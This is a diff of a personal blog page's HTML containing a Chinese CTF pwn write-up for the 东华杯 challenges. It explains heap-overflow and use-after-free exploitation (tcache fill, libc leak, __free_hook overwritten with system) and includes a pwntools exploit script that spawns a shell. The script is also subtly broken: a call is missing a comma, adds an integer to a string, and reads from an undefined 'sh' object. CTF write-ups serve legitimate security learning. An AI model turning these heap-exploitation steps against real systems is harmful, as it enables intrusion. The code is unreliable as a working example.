@@ -4,17 +4,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <meta name="description" content="依旧只能打点pwn的菜鸡。  cpp1libc2.31的漏洞，漏洞点如下，可以直接堆溢出，直接上exp。很正常的思路：填满tcache，泄露libc_base，改fd为hook，改hook为one_gadget。  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849">
+    <meta name="description" content="依旧只能打点pwn的菜鸡。  cpp1libc2.31的漏洞，漏洞点如下，可以直接堆溢出，直接上exp。很正常的思路：填满tcache，泄露libc_base，改fd为hook，改hook为one_gadget。  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
 <meta property="og:type" content="article">
 <meta property="og:title" content="东华杯pwn(wp)">
 <meta property="og:url" content="http://example.com/2021/11/02/%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn-wp/index.html">
 <meta property="og:site_name" content="z1r0's blog">
-<meta property="og:description" content="依旧只能打点pwn的菜鸡。  cpp1libc2.31的漏洞，漏洞点如下，可以直接堆溢出，直接上exp。很正常的思路：填满tcache，泄露libc_base，改fd为hook，改hook为one_gadget。  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849">
+<meta property="og:description" content="依旧只能打点pwn的菜鸡。  cpp1libc2.31的漏洞，漏洞点如下，可以直接堆溢出，直接上exp。很正常的思路：填满tcache，泄露libc_base，改fd为hook，改hook为one_gadget。  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/11/02/%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn-wp/1.png">
 <meta property="og:image" content="http://example.com/2021/11/02/%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn-wp/2.png">
 <meta property="article:published_time" content="2021-11-02T11:44:50.000Z">
-<meta property="article:modified_time" content="2022-05-06T00:48:31.302Z">
+<meta property="article:modified_time" content="2023-08-17T06:34:39.768Z">
 <meta property="article:author" content="z1r0">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -47,6 +47,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
     
 	<!-- mathjax -->
 	
@@ -158,9 +160,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <font size="4">
-
-<blockquote>
+    <blockquote>
 <p>依旧只能打点pwn的菜鸡。</p>
 </blockquote>
 <h1 id="cpp1"><a href="#cpp1" class="headerlink" title="cpp1"></a>cpp1</h1><p>libc2.31的漏洞，漏洞点如下，可以直接堆溢出，直接上exp。很正常的思路：填满tcache，泄露libc_base，改fd为hook，改hook为one_gadget。</p>
@@ -179,7 +179,7 @@
 <p>这题定义了三个数据结构，可以借助uaf，通过字符串的变换可以进行堆块的申请与释放，泄露libc_base，修改fd指向hook，再利用负索引，改hook为system，最后system(“/bin/sh”)拿shell。</p>
 <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'$'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'length:'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'code:'</span>, content)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'''key1="{1}";</span></span><br><span class="line"><span class="string">key2 = "{0}";</span></span><br><span class="line"><span class="string">key3 = "sbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsbsb";</span></span><br><span class="line"><span class="string">key4 = "sbsbsbsbsbsb";</span></span><br><span class="line"><span class="string">array arr[20];</span></span><br><span class="line"><span class="string">a = 0;</span></span><br><span class="line"><span class="string">prints("input a:");</span></span><br><span class="line"><span class="string">aa="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">bb="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">cc="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";</span></span><br><span class="line"><span class="string">dd="/bin/sh";</span></span><br><span class="line"><span class="string">bb="/bin/sh";</span></span><br><span class="line"><span class="string">inputn(a);</span></span><br><span class="line"><span class="string">arr[21]=a;</span></span><br><span class="line"><span class="string">ee="{2}";</span></span><br><span class="line"><span class="string">arr[-13]=1970354902204423;</span></span><br><span class="line"><span class="string">array fini[1];</span></span><br><span class="line"><span class="string">inputn(a);</span></span><br><span class="line"><span class="string">fini[0]=a;</span></span><br><span class="line"><span class="string">bb="{3}";</span></span><br><span class="line"><span class="string">'''</span>.<span class="built_in">format</span>(<span class="string">'1'</span>*<span class="number">0x700</span>, <span class="string">'2'</span>*<span class="number">0x10</span>, <span class="string">'A'</span>*<span class="number">0x40</span>, <span class="string">'D'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="built_in">len</span>(payload + <span class="number">1</span>) payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"input a:"</span>)</span><br><span class="line"></span><br><span class="line">leak_libc=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">"leak libc:"</span>+<span class="built_in">hex</span>(leak_libc))</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ebe70</span></span><br><span class="line">success(<span class="string">"libc base:"</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_base+libc.sym[<span class="string">'__free_hook'</span>]-<span class="number">0x28</span>))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
-</font>
+
   </div>
 </article>
 
